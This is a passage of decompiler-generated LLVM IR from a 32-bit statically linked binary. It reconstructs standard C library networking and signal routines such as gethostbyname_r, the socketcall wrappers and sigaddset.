  %v0_804f5c8 = load i32, i32* @edx, align 4
  %v2_804f5cb = ptrtoint i32* %stack_var_-4 to i32
  %v9_804f5e3 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_805e6ec.209, i32 ptrtoint (i32* @global_var_805e520.208 to i32), i32 460, i32 %v2_804f5cb, i32 %v0_804f5c3, i32 %v0_804f5c8, i32 %v0_804f5c8)
  %v3_804f5e8 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804f5e8
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804f5f0 = load i32, i32* @ebp, align 4
  %v0_804f5f1 = load i32, i32* @edi, align 4
  %v0_804f5f2 = load i32, i32* @esi, align 4
  %v0_804f5f3 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804f603 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804f603, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804f60e = icmp eq i32 %arg1, 0
  br i1 %v4_804f60e, label %dec_label_pc_804f91a, label %dec_label_pc_804f619

dec_label_pc_804f619:                             ; preds = %entry
  %v1_804f619 = call i32 @__errno_location(i32 %v0_804f5f3)
  store i32 %v1_804f619, i32* %eax.global-to-local, align 4
  store i32 %v1_804f619, i32* @esi, align 4
  %v1_804f620 = inttoptr i32 %v1_804f619 to i32*
  %v2_804f620 = load i32, i32* %v1_804f620, align 4
  store i32 %v2_804f620, i32* @edi, align 4
  store i32 0, i32* %v1_804f620, align 4
  %v0_804f631 = load i32, i32* @ebx, align 4
  store i32 %v0_804f631, i32* %stack_var_-108, align 4
  %v7_804f63d = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804f631, i32 %arg5, i32 %arg6, i32 %v1_804f619)
  store i32 %v7_804f63d, i32* %eax.global-to-local, align 4
  %v1_804f645 = icmp eq i32 %v7_804f63d, 0
  br i1 %v1_804f645, label %dec_label_pc_804f91a, label %dec_label_pc_804f64d

dec_label_pc_804f64d:                             ; preds = %dec_label_pc_804f619
  %v1_804f651 = inttoptr i32 %arg6 to i32*
  %v2_804f651 = load i32, i32* %v1_804f651, align 4
  store i32 %v2_804f651, i32* %edx.global-to-local, align 4
  %v9_804f653 = icmp eq i32 %v2_804f651, 1
  br i1 %v9_804f653, label %dec_label_pc_804f66d, label %dec_label_pc_804f658

dec_label_pc_804f658:                             ; preds = %dec_label_pc_804f64d
  %v9_804f658 = icmp eq i32 %v2_804f651, 4
  br i1 %v9_804f658, label %dec_label_pc_804f66d, label %dec_label_pc_804f65d

dec_label_pc_804f65d:                             ; preds = %dec_label_pc_804f658
  %v1_804f65d = add i32 %v2_804f651, 1
  %v8_804f65d = icmp eq i32 %v1_804f65d, 0
  store i32 %v1_804f65d, i32* %edx.global-to-local, align 4
  %v1_804f65e = icmp eq i1 %v8_804f65d, false
  br i1 %v1_804f65e, label %dec_label_pc_804f91a, label %dec_label_pc_804f664

dec_label_pc_804f664:                             ; preds = %dec_label_pc_804f65d
  %v0_804f664 = load i32, i32* @esi, align 4
  %v1_804f664 = inttoptr i32 %v0_804f664 to i32*
  %v2_804f664 = load i32, i32* %v1_804f664, align 4
  %v11_804f664 = icmp eq i32 %v2_804f664, 2
  %v1_804f667 = icmp eq i1 %v11_804f664, false
  br i1 %v1_804f667, label %dec_label_pc_804f91a, label %dec_label_pc_804f66d

dec_label_pc_804f66d:                             ; preds = %dec_label_pc_804f664, %dec_label_pc_804f658, %dec_label_pc_804f64d
  %v0_804f66d = load i32, i32* @ebp, align 4
  store i32 %v0_804f66d, i32* %eax.global-to-local, align 4
  %v0_804f66f = load i32, i32* @edi, align 4
  %v1_804f66f = load i32, i32* @esi, align 4
  %v2_804f66f = inttoptr i32 %v1_804f66f to i32*
  store i32 %v0_804f66f, i32* %v2_804f66f, align 4
  %v0_804f671 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f671 = sub i32 0, %v0_804f671
  %v1_804f673 = urem i32 %v1_804f671, 4
  %v2_804f673 = icmp eq i32 %v1_804f673, 0
  store i32 %v1_804f673, i32* %eax.global-to-local, align 4
  %v0_804f688.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804f673, label %dec_label_pc_804f684, label %dec_label_pc_804f678

dec_label_pc_804f678:                             ; preds = %dec_label_pc_804f66d
  %v2_804f678 = sub i32 %v0_804f688.pre, %v1_804f673
  %v7_804f678 = icmp ult i32 %v0_804f688.pre, %v1_804f673
  br i1 %v7_804f678, label %dec_label_pc_804f915, label %dec_label_pc_804f680

dec_label_pc_804f680:                             ; preds = %dec_label_pc_804f678
  %v0_804f680 = load i32, i32* @ebp, align 4
  %v2_804f680 = add i32 %v0_804f680, %v1_804f673
  store i32 %v2_804f680, i32* @ebp, align 4
  store i32 %v2_804f678, i32* @ebx, align 4
  br label %dec_label_pc_804f684

dec_label_pc_804f684:                             ; preds = %dec_label_pc_804f66d, %dec_label_pc_804f680
  %v0_804f688 = phi i32 [ %v2_804f678, %dec_label_pc_804f680 ], [ %v0_804f688.pre, %dec_label_pc_804f66d ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804f651, align 4
  %tmp43 = icmp ult i32 %v0_804f688, 4
  br i1 %tmp43, label %dec_label_pc_804f915, label %dec_label_pc_804f697

dec_label_pc_804f697:                             ; preds = %dec_label_pc_804f684
  %v0_804f697 = load i32, i32* @ebx, align 4
  %v1_804f697 = add i32 %v0_804f697, -4
  store i32 %v1_804f697, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804f697, 8
  br i1 %tmp44, label %dec_label_pc_804f915, label %dec_label_pc_804f6a3

dec_label_pc_804f6a3:                             ; preds = %dec_label_pc_804f697
  %v0_804f6a3 = load i32, i32* @ebp, align 4
  %v1_804f6a3 = add i32 %v0_804f6a3, 4
  store i32 %v1_804f6a3, i32* %edx.global-to-local, align 4
  %v1_804f6a6 = add i32 %v0_804f697, -12
  store i32 %v1_804f6a6, i32* %eax.global-to-local, align 4
  store i32 %v1_804f6a3, i32* %stack_var_-92, align 4
  %v3_804f6af = inttoptr i32 %v1_804f6a3 to i32*
  store i32 %v0_804f6a3, i32* %v3_804f6af, align 4
  %v0_804f6b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f6b2 = add i32 %v0_804f6b2, 4
  %v2_804f6b2 = inttoptr i32 %v1_804f6b2 to i32*
  store i32 0, i32* %v2_804f6b2, align 4
  %tmp45 = icmp ult i32 %v1_804f6a6, 32
  br i1 %tmp45, label %dec_label_pc_804f915, label %dec_label_pc_804f6bf

dec_label_pc_804f6bf:                             ; preds = %dec_label_pc_804f6a3
  %v0_804f6bf = load i32, i32* @ebx, align 4
  %v1_804f6bf = add i32 %v0_804f6bf, -44
  store i32 %v1_804f6bf, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804f6bf, 256
  br i1 %tmp46, label %dec_label_pc_804f915, label %dec_label_pc_804f6d2

dec_label_pc_804f6d2:                             ; preds = %dec_label_pc_804f6bf
  %v0_804f6d2 = load i32, i32* @ebp, align 4
  %v1_804f6d2 = add i32 %v0_804f6d2, 12
  %v1_804f6d5 = add i32 %v0_804f6d2, 44
  store i32 %v1_804f6d5, i32* @edi, align 4
  store i32 %v1_804f6d5, i32* %stack_var_-108, align 4
  %v3_804f6e6 = inttoptr i32 %v1_804f6d5 to i8*
  %v4_804f6e6 = call i32 @strncpy(i8* %v3_804f6e6, i32 %arg1, i32 %v1_804f6bf)
  %v0_804f6eb = load i32, i32* @edi, align 4
  %v1_804f6eb = load i32, i32* @ebp, align 4
  %v2_804f6eb = add i32 %v1_804f6eb, 12
  %v3_804f6eb = inttoptr i32 %v2_804f6eb to i32*
  store i32 %v0_804f6eb, i32* %v3_804f6eb, align 4
  %v1_804f6f2 = add i32 %v0_804f6d2, 16
  %v2_804f6f2 = inttoptr i32 %v1_804f6f2 to i32*
  store i32 0, i32* %v2_804f6f2, align 4
  %v2_804f6f9 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f6f9, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804f6fb = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804f700 = inttoptr i32 %arg1 to i8*
  %v3_804f700 = call i32 @inet_aton(i8* %v2_804f700, i32 %v0_804f6fb)
  store i32 %v3_804f700, i32* %eax.global-to-local, align 4
  %v1_804f708 = icmp eq i32 %v3_804f700, 0
  br i1 %v1_804f708, label %dec_label_pc_804f744, label %dec_label_pc_804f70c

dec_label_pc_804f70c:                             ; preds = %dec_label_pc_804f6d2
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804f710 = load i32, i32* @edi, align 4
  store i32 %v0_804f710, i32* %arg2, align 4
  %v1_804f712 = add i32 %tmp18, 8
  %v2_804f712 = inttoptr i32 %v1_804f712 to i32*
  store i32 2, i32* %v2_804f712, align 4
  %v0_804f719 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f719 = add i32 %v0_804f719, 12
  %v2_804f719 = inttoptr i32 %v1_804f719 to i32*
  store i32 4, i32* %v2_804f719, align 4
  %v2_804f720 = load i32, i32* %stack_var_-92, align 4
  %v1_804f723 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f723 = add i32 %v1_804f723, 16
  %v3_804f723 = inttoptr i32 %v2_804f723 to i32*
  store i32 %v2_804f720, i32* %v3_804f723, align 4
  %v1_804f72a = load i32, i32* %edx.global-to-local, align 4
  %v2_804f72a = add i32 %v1_804f72a, 4
  %v3_804f72a = inttoptr i32 %v2_804f72a to i32*
  store i32 %v1_804f6d2, i32* %v3_804f72a, align 4
  %v0_804f731 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f731, i32* %v1_804f603, align 4
  store i32 0, i32* %v1_804f651, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f91a

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f6d2
  %v0_804f744 = call i32 @__open_nameservers()
  store i32 %v0_804f744, i32* @eax, align 4
  %v2_804f754 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804f754, i32* @ebx, align 4
  store i32 %v2_804f754, i32* %stack_var_-108, align 4
  %v2_804f759 = call i32 @__pthread_return_void(i32 %v2_804f754, i32 134550743)
  store i32 %v2_804f759, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %stack_var_-108, align 4
  %v1_804f765 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058488.210 to i32))
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* @ecx, align 4
  store i32 134550743, i32* @eax, align 4
  store i32 %v2_804f754, i32* %stack_var_-108, align 4
  %v0_804f76f = load i32, i32* @global_var_805eb74.211, align 4
  store i32 %v0_804f76f, i32* @esi, align 4
  %v2_804f775 = call i32 @__pthread_return_void(i32 %v2_804f754, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804f790 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804f795 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804f795, i32* %eax.global-to-local, align 4
  store i32 %v2_804f795, i32* %stack_var_-108, align 4
  %v0_804f79f = load i32, i32* @esi, align 4
  %v7_804f7a6 = call i32 @__dns_lookup(i8* %v2_804f700, i32 1, i32 %v0_804f79f, i32 ptrtoint (i32* @global_var_805eb68.212 to i32), i32 %v2_804f795, i32 %v2_804f790)
  store i32 %v7_804f7a6, i32* %eax.global-to-local, align 4
  %v2_804f7ae = icmp slt i32 %v7_804f7a6, 0
  %v1_804f7b0 = icmp eq i1 %v2_804f7ae, false
  br i1 %v1_804f7b0, label %dec_label_pc_804f7c6, label %dec_label_pc_804f7b2

dec_label_pc_804f7b2:                             ; preds = %dec_label_pc_804f744
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804f651, align 4
  br label %dec_label_pc_804f91a

dec_label_pc_804f7c6:                             ; preds = %dec_label_pc_804f744
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804f7d9 = icmp ugt i32 %v1_804f6bf, 256
  %v15_804f7d9 = icmp eq i32 %v0_804f6bf, 300
  %v2_804f7dd = or i1 %v15_804f7d9, %v10_804f7d9
  br i1 %v2_804f7dd, label %dec_label_pc_804f878, label %dec_label_pc_804f7df

dec_label_pc_804f7df:                             ; preds = %dec_label_pc_804f7c6
  %v3_804f7e2 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f7e2, i32* %stack_var_-108, align 4
  %v1_804f7e6 = call i32 @free(i32 %v3_804f7e2)
  store i32 %v1_804f7e6, i32* %eax.global-to-local, align 4
  store i32 %v3_804f7e2, i32* @edi, align 4
  %v3_804f7ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f7ec, i32* %stack_var_-108, align 4
  %v1_804f7f0 = call i32 @free(i32 %v3_804f7ec)
  store i32 -1, i32* %v1_804f651, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8f0

dec_label_pc_804f878:                             ; preds = %dec_label_pc_804f7c6
  %v3_804f87d.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804f881.pre = load i32, i32* @edi, align 4
  store i32 %v0_804f881.pre, i32* %stack_var_-108, align 4
  %v3_804f882 = inttoptr i32 %v0_804f881.pre to i8*
  %v4_804f882 = call i32 @strncpy(i8* %v3_804f882, i32 %v3_804f87d.pre, i32 %v1_804f6bf)
  store i32 %v4_804f882, i32* %eax.global-to-local, align 4
  %v3_804f888 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f888, i32* %stack_var_-108, align 4
  %v1_804f88c = call i32 @free(i32 %v3_804f888)
  store i32 %v1_804f88c, i32* %eax.global-to-local, align 4
  %v12_804f894 = icmp eq i32 %tmp10, 1
  %v1_804f899 = icmp eq i1 %v12_804f894, false
  br i1 %v1_804f899, label %dec_label_pc_804f8f5, label %dec_label_pc_804f89b

dec_label_pc_804f89b:                             ; preds = %dec_label_pc_804f878
  %v0_804f89b = load i32, i32* @edx, align 4
  %v0_804f8a2 = load i32, i32* @ebp, align 4
  store i32 %v0_804f8a2, i32* %stack_var_-108, align 4
  %v3_804f8a3 = inttoptr i32 %tmp to i16*
  %v4_804f8a3 = call i32 @memcpy(i16* %v3_804f8a3, i32 4, i32 %v0_804f89b)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804f8ac = load i32, i32* @edi, align 4
  store i32 %v0_804f8ac, i32* %arg2, align 4
  %v1_804f8ae = add i32 %tmp18, 8
  %v2_804f8ae = inttoptr i32 %v1_804f8ae to i32*
  store i32 2, i32* %v2_804f8ae, align 4
  %v0_804f8b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f8b5 = add i32 %v0_804f8b5, 12
  %v2_804f8b5 = inttoptr i32 %v1_804f8b5 to i32*
  store i32 4, i32* %v2_804f8b5, align 4
  %v3_804f8bc = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804f8bc, i32* %edx.global-to-local, align 4
  %v1_804f8c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f8c0 = add i32 %v1_804f8c0, 16
  %v3_804f8c0 = inttoptr i32 %v2_804f8c0 to i32*
  store i32 %v3_804f8bc, i32* %v3_804f8c0, align 4
  %v1_804f8c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f8c7 = add i32 %v1_804f8c7, 4
  %v3_804f8c7 = inttoptr i32 %v2_804f8c7 to i32*
  store i32 %v1_804f6d2, i32* %v3_804f8c7, align 4
  %v2_804f8ca = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f8ca, i32* %eax.global-to-local, align 4
  %v3_804f8cb = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f8cb, i32* %stack_var_-108, align 4
  %v1_804f8cf = call i32 @free(i32 %v3_804f8cb)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804f603, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804f651, align 4
  br label %dec_label_pc_804f8f0

dec_label_pc_804f8f0:                             ; preds = %dec_label_pc_804f8f5, %dec_label_pc_804f7df, %dec_label_pc_804f89b
  br label %dec_label_pc_804f91a

dec_label_pc_804f8f5:                             ; preds = %dec_label_pc_804f878
  %v3_804f8f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f8f8, i32* %stack_var_-108, align 4
  %v1_804f8fc = call i32 @free(i32 %v3_804f8f8)
  store i32 1, i32* %v1_804f651, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8f0

dec_label_pc_804f915:                             ; preds = %dec_label_pc_804f6bf, %dec_label_pc_804f6a3, %dec_label_pc_804f697, %dec_label_pc_804f684, %dec_label_pc_804f678
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f91a

dec_label_pc_804f91a:                             ; preds = %dec_label_pc_804f664, %dec_label_pc_804f65d, %dec_label_pc_804f619, %entry, %dec_label_pc_804f8f0, %dec_label_pc_804f7b2, %dec_label_pc_804f70c, %dec_label_pc_804f915
  store i32 %v0_804f5f3, i32* @ebx, align 4
  store i32 %v0_804f5f2, i32* @esi, align 4
  store i32 %v0_804f5f1, i32* @edi, align 4
  store i32 %v0_804f5f0, i32* @ebp, align 4
  %v0_804f921 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804f921

; uselistorder directives
  uselistorder i32 %v2_804f754, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804f6d5, { 1, 0, 2 }
  uselistorder i32 %v1_804f6d2, { 1, 0 }
  uselistorder i32 %v1_804f6bf, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804f688.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804f673, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804f651, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804f651, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804f603, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f91a, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f8f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f684, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f93f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f946 = call i32 @__socketcall(i32 3, i32 %v2_804f93f)
  ret i32 %v2_804f946

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f96b = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f972 = call i32 @__socketcall(i32 6, i32 %v2_804f96b)
  ret i32 %v2_804f972

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804f9a7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804f9ae = call i32 @__socketcall(i32 15, i32 %v2_804f9a7)
  ret i32 %v2_804f9ae

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804f9db = ptrtoint i32* %stack_var_-16 to i32
  %v2_804f9e2 = call i32 @__socketcall(i32 10, i32 %v2_804f9db)
  ret i32 %v2_804f9e2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fa0f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fa16 = call i32 @__socketcall(i32 9, i32 %v2_804fa0f)
  ret i32 %v2_804fa16

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804fa53 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804fa5a = call i32 @__socketcall(i32 11, i32 %v2_804fa53)
  ret i32 %v2_804fa5a

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fa8f = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fa96 = call i32 @__socketcall(i32 14, i32 %v2_804fa8f)
  ret i32 %v2_804fa96

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fabb = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fac2 = call i32 @__socketcall(i32 1, i32 %v2_804fabb)
  ret i32 %v2_804fac2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804fae4, label %dec_label_pc_804fad7

dec_label_pc_804fad7:                             ; preds = %entry
  %v1_804fad7 = add i32 %arg1, -64
  %v3_804fad7 = sub i32 63, %arg1
  %v4_804fad7 = and i32 %v3_804fad7, %arg1
  %v5_804fad7 = icmp slt i32 %v4_804fad7, 0
  %v6_804fad7 = icmp eq i32 %v1_804fad7, 0
  %v7_804fad7 = icmp slt i32 %v1_804fad7, 0
  %v3_804fada = icmp eq i1 %v7_804fad7, %v5_804fad7
  %v4_804fada = icmp eq i1 %v6_804fad7, false
  %v5_804fada = and i1 %v4_804fada, %v3_804fada
  br i1 %v5_804fada, label %dec_label_pc_804fae4, label %dec_label_pc_804fadc

dec_label_pc_804fadc:                             ; preds = %dec_label_pc_804fad7
  %v4_804fadf = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fae4

dec_label_pc_804fae4:                             ; preds = %dec_label_pc_804fad7, %entry, %dec_label_pc_804fadc
  %v1_804fae4 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804fae9 = inttoptr i32 %v1_804fae4 to i32*
  store i32 22, i32* %v1_804fae9, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804fad7, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fae4, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804fb06 = inttoptr i32 %arg1 to i8*
  %v4_804fb06 = call i32 @__GI_memset(i8* %v3_804fb06, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804fb14 = load i32, i32* @ebx, align 4
  %v15_804fb15 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804fb29 = icmp eq i32 %arg2, -1
  br i1 %v10_804fb29, label %dec_label_pc_804fb37, label %dec_label_pc_804fb2e

dec_label_pc_804fb2e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804fb37, label %dec_label_pc_804fb32

dec_label_pc_804fb32:                             ; preds = %dec_label_pc_804fb2e
  %v7_804fb35 = icmp sgt i32 %arg1, 64
  br i1 %v7_804fb35, label %dec_label_pc_804fb37, label %dec_label_pc_804fb44

dec_label_pc_804fb37:                             ; preds = %dec_label_pc_804fb32, %dec_label_pc_804fb2e, %entry
  %v1_804fb37 = call i32 @__errno_location(i32 %v0_804fb14)
  store i32 %v1_804fb37, i32* %eax.global-to-local, align 4
  %v1_804fb3c = inttoptr i32 %v1_804fb37 to i32*
  store i32 22, i32* %v1_804fb3c, align 4
  br label %dec_label_pc_804fbb8

dec_label_pc_804fb44:                             ; preds = %dec_label_pc_804fb32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fb52

dec_label_pc_804fb52:                             ; preds = %dec_label_pc_804fb52.dec_label_pc_804fb52_crit_edge, %dec_label_pc_804fb44
  %v0_804fb52 = phi i32 [ %v15_804fb15, %dec_label_pc_804fb44 ], [ %v0_804fb52.pre, %dec_label_pc_804fb52.dec_label_pc_804fb52_crit_edge ]
  %v1_804fb5d17 = phi i32 [ 31, %dec_label_pc_804fb44 ], [ %v1_804fb5d, %dec_label_pc_804fb52.dec_label_pc_804fb52_crit_edge ]
  %v2_804fb52 = mul i32 %v1_804fb5d17, 4
  %v3_804fb52 = add i32 %v2_804fb52, 160
  %v4_804fb52 = add i32 %v3_804fb52, %v0_804fb52
  %v5_804fb52 = inttoptr i32 %v4_804fb52 to i32*
  store i32 0, i32* %v5_804fb52, align 4
  %v0_804fb5d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb5d = add i32 %v0_804fb5d.pre, -1
  %v9_804fb5d = icmp slt i32 %v1_804fb5d, 0
  store i32 %v1_804fb5d, i32* %eax.global-to-local, align 4
  %v1_804fb5e = icmp eq i1 %v9_804fb5d, false
  br i1 %v1_804fb5e, label %dec_label_pc_804fb52.dec_label_pc_804fb52_crit_edge, label %dec_label_pc_804fb60

dec_label_pc_804fb52.dec_label_pc_804fb52_crit_edge: ; preds = %dec_label_pc_804fb52
  %v0_804fb52.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fb52

dec_label_pc_804fb60:                             ; preds = %dec_label_pc_804fb52
  %v0_804fb60 = load i32, i32* @edx, align 4
  %v2_804fb63 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804fb63, i32* %eax.global-to-local, align 4
  %v4_804fb6b = call i32 @__sigaddset(i32 %v2_804fb63, i32 %arg1, i32 %v0_804fb60, i32 %v0_804fb60)
  store i32 %v4_804fb6b, i32* %eax.global-to-local, align 4
  %v2_804fb73 = icmp slt i32 %v4_804fb6b, 0
  br i1 %v2_804fb73, label %dec_label_pc_804fbb8, label %dec_label_pc_804fb77

dec_label_pc_804fb77:                             ; preds = %dec_label_pc_804fb60
  %v4_804fb7f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_805e760.213 to i32), i32 %arg1, i32 %v4_804fb6b, i32 %v4_804fb6b)
  %v2_804fb98 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804fb9d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fb9d, i32* %eax.global-to-local, align 4
  %v4_804fba6 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804fb98)
  store i32 %v4_804fba6, i32* %eax.global-to-local, align 4
  %v2_804fbae = icmp slt i32 %v4_804fba6, 0
  br i1 %v2_804fbae, label %dec_label_pc_804fbb8, label %dec_label_pc_804fbb2

dec_label_pc_804fbb2:                             ; preds = %dec_label_pc_804fb77
